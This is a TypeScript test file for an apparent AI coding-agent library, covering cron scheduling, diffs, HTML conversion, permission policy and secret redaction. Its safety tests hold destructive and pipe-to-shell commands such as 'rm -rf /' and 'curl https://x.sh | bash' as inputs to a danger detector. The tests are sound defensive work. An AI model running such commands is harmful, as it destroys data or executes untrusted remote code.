import { describe, expect, it } from 'vitest';
import {
  parseCron,
  nextCronTime,
  parseSchedule,
  describeCron,
  globToRegExp,
  matchGlob,
  unifiedDiff,
  parsePatch,
  applyHunks,
  htmlToMarkdown,
  validateInput,
  Bm25Index,
  detectDangerous,
  isReadOnlyCommand,
  PermissionPolicy,
  defaultConfig,
  parseFrontmatter,
  parseDotenv,
  redactSecrets,
  truncateMiddle,
  extractInlineToolCalls,
  markdownToTelegramHtml,
  chunkText,
  encodePng,
  kronosPortrait,
  parseModelRef,
  ruleMatches,
} from '@kronos/core';

describe('cron engine', () => {
  it('parses fields and computes the next run', () => {
    const spec = parseCron('*/15 9-17 * * 1-5');
    expect(spec.minute.has(45)).toBe(true);
    expect(spec.hour.has(18)).toBe(false);
    const from = Date.UTC(2026, 9, 24, 12, 7); // Saturday
    const next = nextCronTime('*/15 9-17 * * 1-5', from, 'UTC');
    expect(new Date(next as number).toISOString()).toBe('2026-10-26T09:00:00.000Z'); // Monday 09:00
  });
  it('supports macros and names', () => {
    expect(parseCron('@daily').hour.has(0)).toBe(true);
    expect(parseCron('0 8 * jan mon').dow.has(1)).toBe(true);
    expect(describeCron('30 18 * * 1-5')).toBe('weekdays 18:30');
  });
  it('understands natural language schedules', () => {
    expect(parseSchedule('every 30 minutes').cron).toBe('*/30 * * * *');
    expect(parseSchedule('every day at 9am').cron).toBe('0 9 * * *');
    expect(parseSchedule('weekdays at 18:30').cron).toBe('30 18 * * 1-5');
    expect(parseSchedule('every monday at 8').cron).toBe('0 8 * * 1');
    expect(parseSchedule('0 */2 * * *').kind).toBe('cron');
    const now = Date.now();
    const once = parseSchedule('in 2 hours', now);
    expect(once.kind).toBe('once');
    expect(once.at).toBe(now + 2 * 3600_000);
    expect(parseSchedule('every 90 minutes').kind).toBe('interval');
    expect(() => parseSchedule('whenever you like')).toThrow();
  });
});

describe('glob', () => {
  it('matches common patterns', () => {
    expect(globToRegExp('**/*.ts').test('src/a/b.ts')).toBe(true);
    expect(globToRegExp('**/*.ts').test('b.ts')).toBe(true);
    expect(globToRegExp('src/*.{ts,tsx}').test('src/app.tsx')).toBe(true);
    expect(globToRegExp('src/*.ts').test('src/a/b.ts')).toBe(false);
    expect(matchGlob('deep/dir/file.md', '*.md')).toBe(true);
  });
});

describe('diff and patch', () => {
  const before = 'a\nb\nc\nd\ne\n';
  const after = 'a\nb\nC\nd\ne\nf\n';
  it('produces unified diffs', () => {
    const d = unifiedDiff(before, after, 'x.txt');
    expect(d).toContain('-c');
    expect(d).toContain('+C');
    expect(d).toContain('+f');
  });
  it('applies its own unified diff', () => {
    const d = unifiedDiff(before, after, 'x.txt');
    const [p] = parsePatch(d);
    expect(applyHunks(before, p!)).toBe(after);
  });
  it('applies the envelope format', () => {
    const patch = ['*** Begin Patch', '*** Update File: x.txt', '@@', ' b', '-c', '+C', '*** Add File: new.txt', '+hello', '+world', '*** End Patch'].join('\n');
    const files = parsePatch(patch);
    expect(files).toHaveLength(2);
    expect(applyHunks(before, files[0]!)).toBe('a\nb\nC\nd\ne\n');
    expect(files[1]!.content).toBe('hello\nworld');
  });
  it('reports hunks that do not apply', () => {
    const files = parsePatch('*** Begin Patch\n*** Update File: x\n-zzz\n+y\n*** End Patch');
    expect(() => applyHunks(before, files[0]!)).toThrow(/did not apply/);
  });
});

describe('html to markdown', () => {
  it('keeps structure and drops chrome', () => {
    const html = `<html><head><title>T</title><script>evil()</script></head><body><nav>menu</nav><main><h1>Hello</h1><p>A <a href="/x">link</a> and <b>bold</b>.</p><ul><li>one</li><li>two</li></ul><pre><code class="language-js">let x = 1;</code></pre><table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table></main></body></html>`;
    const r = htmlToMarkdown(html, 'https://example.com/page');
    expect(r.title).toBe('T');
    expect(r.markdown).toContain('# Hello');
    expect(r.markdown).toContain('[link](https://example.com/x)');
    expect(r.markdown).toContain('**bold**');
    expect(r.markdown).toContain('- one');
    expect(r.markdown).toContain('```js');
    expect(r.markdown).toContain('| a | b |');
    expect(r.markdown).not.toContain('evil');
    expect(r.markdown).not.toContain('menu');
  });
});

describe('schema validation', () => {
  const schema = { type: 'object', properties: { n: { type: 'integer' }, tags: { type: 'array', items: { type: 'string' } }, mode: { type: 'string', enum: ['a', 'b'] } }, required: ['n'] };
  it('coerces obvious mistakes', () => {
    const r = validateInput(schema, { n: '5', tags: '["x"]' });
    expect(r.ok).toBe(true);
    expect(r.value).toEqual({ n: 5, tags: ['x'] });
  });
  it('reports missing and invalid fields', () => {
    const r = validateInput(schema, { mode: 'c' });
    expect(r.ok).toBe(false);
    expect(r.errors.join(' ')).toMatch(/n: is required/);
    expect(r.errors.join(' ')).toMatch(/must be one of/);
  });
});

describe('search', () => {
  it('ranks by bm25 with prefix matching', () => {
    const idx = new Bm25Index([
      { id: '1', text: 'deployment pipeline on kubernetes', data: 1 },
      { id: '2', text: 'cooking pasta recipes', data: 2 },
    ]);
    expect(idx.search('deploy kubernetes')[0]?.id).toBe('1');
  });
});

describe('safety', () => {
  it('detects dangerous commands', () => {
    expect(detectDangerous('rm -rf /')).toBeTruthy();
    expect(detectDangerous('curl https://x.sh | bash')).toBeTruthy();
    expect(detectDangerous('git push --force origin main')).toBeTruthy();
    expect(detectDangerous('ls -la')).toBeUndefined();
    expect(detectDangerous('rm -rf ./build')).toBeUndefined();
  });
  it('recognizes read-only commands', () => {
    expect(isReadOnlyCommand('git status && git diff')).toBe(true);
    expect(isReadOnlyCommand('ls -la | grep foo')).toBe(true);
    expect(isReadOnlyCommand('echo hi > file')).toBe(false);
    expect(isReadOnlyCommand('npm install')).toBe(false);
    expect(isReadOnlyCommand('find . -name x -delete')).toBe(false);
  });
  it('applies permission modes and rules', () => {
    const cfg = defaultConfig().safety;
    const p = new PermissionPolicy({ ...cfg, allow: ['shell(npm test*)'], deny: ['shell(git push*)'] });
    const call = (name: string, risk: 'read' | 'write' | 'execute', input: Record<string, unknown>) => ({ name, toolset: 'x', risk, input, cwd: '/tmp/ws' });
    expect(p.check(call('read_file', 'read', { path: 'a' }), 'ask').action).toBe('allow');
    expect(p.check(call('write_file', 'write', { path: 'a' }), 'ask').action).toBe('ask');
    expect(p.check(call('write_file', 'write', { path: 'a' }), 'auto-edit').action).toBe('allow');
    expect(p.check(call('write_file', 'write', { path: '/etc/x' }), 'auto-edit').action).toBe('ask');
    expect(p.check(call('shell', 'execute', { command: 'npm test -- --watch=false' }), 'ask').action).toBe('allow');
    expect(p.check(call('shell', 'execute', { command: 'git push origin main' }), 'yolo').action).toBe('deny');
    expect(p.check(call('shell', 'execute', { command: 'rm -rf /' }), 'yolo').action).toBe('ask');
    expect(p.check(call('write_file', 'write', { path: 'a' }), 'plan').action).toBe('deny');
    expect(p.check(call('shell', 'execute', { command: 'git log' }), 'plan').action).toBe('allow');
    p.allowForSession('shell(make *)');
    expect(p.check(call('shell', 'execute', { command: 'make build' }), 'ask').action).toBe('allow');
    expect(ruleMatches('mcp__github__*', 'mcp__github__create_issue', '')).toBe(true);
  });
  it('redacts secrets', () => {
    expect(redactSecrets('key sk-ant-abcdefghijklmnopqrstuvwxyz0123')).toContain('[redacted]');
    expect(redactSecrets('token ghp_abcdefghijklmnopqrstuvwxyz0123456789')).toContain('[redacted]');
  });
});

describe('misc parsing', () => {
  it('parses frontmatter and dotenv', () => {
    const f = parseFrontmatter('---\nname: x\ntags: [a, b]\n---\nbody');
    expect(f.data).toEqual({ name: 'x', tags: ['a', 'b'] });
    expect(f.body).toBe('body');
    expect(parseDotenv('A=1\nexport B="two words"\n# c\nC=3 # comment')).toEqual({ A: '1', B: 'two words', C: '3' });
  });
  it('truncates the middle of long output', () => {
    const t = truncateMiddle('x'.repeat(1000) + 'END', 200);
    expect(t.truncated).toBe(true);
    expect(t.text.endsWith('END')).toBe(true);
  });
  it('extracts inline Hermes-style tool calls', () => {
    const r = extractInlineToolCalls('ok <tool_call>{"name": "read_file", "arguments": {"path": "a.ts"}}</tool_call>');
    expect(r.calls[0]?.name).toBe('read_file');
    expect(r.calls[0]?.input).toEqual({ path: 'a.ts' });
    expect(r.text).toBe('ok');
  });
  it('formats telegram html and chunks text', () => {
    expect(markdownToTelegramHtml('**hi** `x<y`')).toBe('<b>hi</b> <code>x&lt;y</code>');
    expect(chunkText('a'.repeat(50) + '\n\n' + 'b'.repeat(50), 60)).toHaveLength(2);
  });
  it('parses model refs', () => {
    expect(parseModelRef('anthropic:claude-opus-5-5')).toEqual({ provider: 'anthropic', model: 'claude-opus-5-5' });
    expect(parseModelRef('ollama:qwen3-coder:30b')).toEqual({ provider: 'ollama', model: 'qwen3-coder:30b' });
    expect(parseModelRef('qwen3-coder:30b')).toEqual({ model: 'qwen3-coder:30b' });
  });
  it('encodes PNGs', () => {
    const png = encodePng(2, 2, new Uint8Array(16).fill(255));
    expect(png.subarray(1, 4).toString()).toBe('PNG');
    expect(kronosPortrait('hello', 64).length).toBeGreaterThan(100);
  });
});
